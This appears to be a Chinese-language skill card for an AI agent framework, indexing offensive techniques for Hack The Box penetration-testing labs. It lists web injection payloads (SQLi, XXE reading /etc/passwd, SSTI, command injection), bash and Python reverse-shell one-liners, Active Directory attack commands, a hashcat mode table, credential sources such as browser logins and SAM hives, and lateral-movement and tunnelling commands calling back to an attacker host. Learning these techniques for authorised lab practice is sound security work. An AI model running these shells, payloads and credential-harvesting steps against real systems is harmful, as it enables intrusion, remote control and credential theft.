---
name: 'htb-master-checklist'
description: 'HTB 按领域速查索引：题型信号/Web/CMS/反弹Shell/提权优先级/凭据/hashcat 表/横向命令清单，各节指向深卡。完整执行流程见 htb-methodology。'
metadata: { domain: meta, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# HTB 综合攻击检查表（按领域速查索引）

> 📌 按领域速查。**完整执行流程与教训见 htb-methodology 卡**；各深卡按需加载。

---

## 题型信号速查（题型识别）

> 🔴 完整题型识别树 + OS 判定 → htb-methodology 卡（阶段0）

| 信号 | 题型 | 记忆 |
|------|------|------|
| KDS Root Key 存在 | BadSuccessor/BetterSuccessor | ad-type-recognition |
| NTLM 全失败，Kerberos 成功 | Kerberos-Only AD | kerberos-only-ad |
| 多域 `nltest /domain_trusts` | 跨林攻击 | kerberos-only-ad |
| .vmem/.vmdk/.vhd 文件 | VM 取证 | ad-checklist#6 |
| MSSQL 端口 1433/1434 | MSSQL 攻击链 | mssql-attack-chain |
| ADCS HTTP 端点 | ESC1-16 | adcs-attack-chain |
| Web 登录页面 | CMS RCE / SSTI / SQLi | cms-framework-rce |
| `.git/` 目录暴露 | Git 历史泄露 | web-chained-attacks |
| localhost:25151 (Cobbler) | CVE-2024-47533 | cve-2024-47533-cobbler-rce |

---

## Web 攻击速查（侦察/初始立足）

> 🔴 目录爆破/vhost/CMS 识别命令（nmap/gobuster/ffuf/whatweb）→ htb-methodology 卡（阶段1 侦察）

### Web 漏洞速查
| 漏洞类型 | 速查记忆 | 快速测试 |
|---------|---------|---------|
| SQL Injection | mssql-attack-chain / web-attacks | `' OR 1=1--` |
| NoSQL Injection | web-attacks#5 | `{"$ne": null}` |
| SSTI | web-attacks#1 | `{{7*7}}` |
| XSS | web-attacks / XSS 章节 | `<img src=x onerror=alert(1)>` |
| SSRF | web-attacks / SSRF 章节 | `http://127.0.0.1:PORT` |
| XXE | web-attacks#2 | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
| LFI | web-attacks#6 | `../../../../etc/passwd` |
| Command Injection | web-attacks#7 | `; id` `\|id` `\`id\`` `$(id)` |
| Deserialization | dotnet-pipe-yaml-deserialization（.NET）与 python-sandbox-escape（Python） | 检查 ac ed 00 05 / rO0AB / gAS |
| Cypher Injection | cypher-injection | `'}) RETURN w UNION MATCH ...` |
| H2 Java Alias | h2-java-alias-rce | JDBC URL: `INIT=CREATE ALIAS` |
| Python Sandbox | python-sandbox-escape | `().__class__.__mro__[-1].__subclasses__()` |

### CMS 快速攻击
| CMS | 快速命令 | 记忆 |
|-----|---------|------|
| WordPress | `wpscan --url http://target -e ap,at,u` | cms-framework-rce |
| Joomla | API 泄露: `/api/index.php/v1/config/application?public=true` | cms-framework-rce |
| Drupal | CVE-2018-7600 PoC | cms-framework-rce |
| Magento | SQLi → admin → Froghopper | cms-framework-rce |
| Apache NiFi | `/nifi` → DBCPConnectionPool → H2 Alias | h2-java-alias-rce |
| Mirth Connect | CVE-2023-43208 XStream deser | web-chained-attacks |
| Grafana | CVE-2021-43798 path traversal / CVE-2024-9264 | cms-framework-rce |

---

## 反弹 Shell 速查（初始立足）

```bash
# Linux
bash -i >& /dev/tcp/IP/PORT 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")'

# Windows (PowerShell)
powershell -e <base64_encoded_reverse_shell>
```

> 🔴 获 shell 后立即执行序列（env/config/内网服务/flag）→ htb-methodology 卡（阶段3 横向）
> 🔴 监听端 PTY 纪律（socat/nc + 等待策略）→ htb-methodology 卡

---

## Linux 提权速查（提权）

### 提权优先级（按成功率）
| 优先级 | 检查项 | 记忆 |
|--------|--------|------|
| 🔴 1 | `sudo -l` → GTFOBins 对照 | sudo-escape-techniques |
| 🔴 2 | Cron jobs → 可写脚本/PATH/通配符 | cron-privesc-patterns |
| 🔴 3 | SUID 二进制 → GTFOBins | linux-privesc |
| 🔴 4 | Docker group → 容器逃逸 | linux-privesc |
| 🔴 5 | Capabilities → cap_setuid 等 | linux-privesc |
| 🟠 6 | writable /etc/passwd, /etc/shadow | `ls -la /etc/passwd /etc/shadow` |
| 🟠 7 | sudo 版本 CVE | `sudo --version` |
| 🟠 8 | localhost root 服务 → eval/exec 注入 | web-chained-attacks |
| 🟡 9 | Kernel exploit (最后) | searchsploit kernel |

### Sudo Escape 一键对照
→ 详见 sudo-escape-techniques 完整矩阵（40+ 命令）

### Cron Abuse 一键检查
→ 详见 cron-privesc-patterns 5 种模式

---

## Windows / AD 提权速查（提权）

> 🔴 题型判定 → ad-type-recognition + ad-checklist#0；完整枚举序列 → htb-methodology 卡（阶段4 提权）

### 提权优先级
| 优先级 | 检查项 | 条件 |
|--------|--------|------|
| 🔴 1 | BetterSuccessor | KDS + CreateChild + GenericWrite |
| 🔴 2 | Shadow Credentials | GenericWrite on target |
| 🔴 3 | ADCS ESC1-16 | certipy find -vulnerable |
| 🔴 4 | RBCD + S4U | PetitPotam + relay |
| 🔴 5 | Kerberoast/ASREP | 仅当上面不通 |
| 🔴 6 | SeImpersonate → Potato | whoami /priv |
| 🔴 7 | SeBackup → SAM dump | whoami /priv |

### AD 攻击链速查
```bash
# 域枚举
nxc smb DC -u '' -p '' --rid-brute      # 用户枚举
nxc smb DC -u user -p pass --shares     # 共享
bloodhound-python -d domain -u user -p pass -c All

# Kerberos-Only 环境 → kerberos-only-ad
# ALL commands need: -k -no-pass [-aesKey <key>]
# Clock sync: ntpdate -bu <DC_IP> before every operation

# MSSQL → mssql-attack-chain
# ADCS → adcs-attack-chain
```

---

## 凭据收集速查（横向/提权）

### 哈希类型速查
| 格式 | 类型 | hashcat -m |
|------|------|-----------|
| `$2a$` / `$2b$` / `$2y$` | bcrypt | 3200 |
| `$6$` | sha512crypt | 1800 |
| `pbkdf2:sha256:N$salt$hash` | Werkzeug | 10900 |
| `$krb5tgs$23$` | Kerberoast | 13100 |
| `$krb5asrep$23$` | AS-REP | 18200 |
| `$P$` / `$H$` | phpBB/WordPress | 400 |
| `sha256$` / `sha1$` | Django/Flask | vary |
| 32 hex (全大写) | NTLM | 1000 |
| WPA2 handshake (.22000) | WPA2 | 22000 |

### 常见凭据源
```
[ ] ConsoleHost_history.txt (PowerShell)
[ ] .git/config, .git-credentials
[ ] *.conf, *.properties, *.env, *.ini, *.xml
[ ] sysprep.xml, unattend.xml
[ ] /opt/*/conf/, /var/www/*/config/
[ ] SAM/SYSTEM hive → secretsdump
[ ] DPAPI → LaZagne
[ ] LAPS → reg query AdmPwd
[ ] mRemoteNG confCons.xml
[ ] Firefox logins.json, Chrome Login Data
[ ] KeePass .kdbx → keepass2john
[ ] SQLite/MySQL DB → dump
```

---

## 横向移动速查（横向移动）

```
[ ] WinRM: evil-winrm -i TARGET -u user -p pass
[ ] PsExec: impacket-psexec domain/user:pass@TARGET
[ ] WMI: impacket-wmiexec domain/user:pass@TARGET
[ ] SMBExec: impacket-smbexec domain/user:pass@TARGET
[ ] PTH: evil-winrm -i TARGET -u user -H <NT_HASH>
[ ] Kerberos: impacket-psexec -k -no-pass domain/user@TARGET
[ ] RDP: xfreerdp /v:TARGET /u:user /p:pass /cert:ignore
[ ] SSH tunnel: ssh -D 1080 user@target → proxychains
[ ] Ligolo-ng: /tmp/agent -connect ATTACKER:PORT -ignore-cert
[ ] chisel: ./chisel client ATTACKER:PORT R:socks
```

> 🔴 横向移动决策树 + 反模式 → lateral-movement 技能；内网服务 fuzz → unknown-service-probe 技能

---

## 记忆速查索引

| 类别 | 记忆 | 内容 |
|------|------|------|
| **总览** | ad-type-recognition | OS→题型判定树 |
| | ad-checklist | Windows/AD 全阶段 |
| | linux-privesc | Linux 提权 9 阶段 |
| **Web** | web-attacks | SSTI/XXE/SQLi/LFI 等 payload |
| | cms-framework-rce | 25+ CMS CVE 速查 |
| | web-chained-attacks | 多阶段链式攻击模式 |
| | python-sandbox-escape | Python 沙箱逃逸 |
| **注入** | mssql-attack-chain | MSSQL 全攻击面 |
| | h2-java-alias-rce | H2 JDBC → Java RCE |
| | dotnet-pipe-yaml-deserialization（.NET）与 python-sandbox-escape（Python） | 反序列化攻击 |
| **AD** | adcs-attack-chain | ADCS ESC1-16 |
| | kerberos-only-ad | No-NTLM/AES256 范式 |
| | ntlm-relay-chain | NTLM Relay + Coercion |
| **提权** | sudo-escape-techniques | 40+ sudo 命令逃逸 |
| | cron-privesc-patterns | 5 种 cron 提权模式 |
| **技巧** | living-off-the-land | 各 OS 文件传输 |
| | tunneling-port-forwarding | 隧道/端口转发 |
| | credential-spraying-password-reuse | 凭据去交互化 |
| **实战** | htb-methodology | 打靶强制检查表 |
| | htb-workflow | 本地 bash 工作流 |
| | debug-5whys | 卡住时 5 Whys 框架 + 推理反模式避坑 |
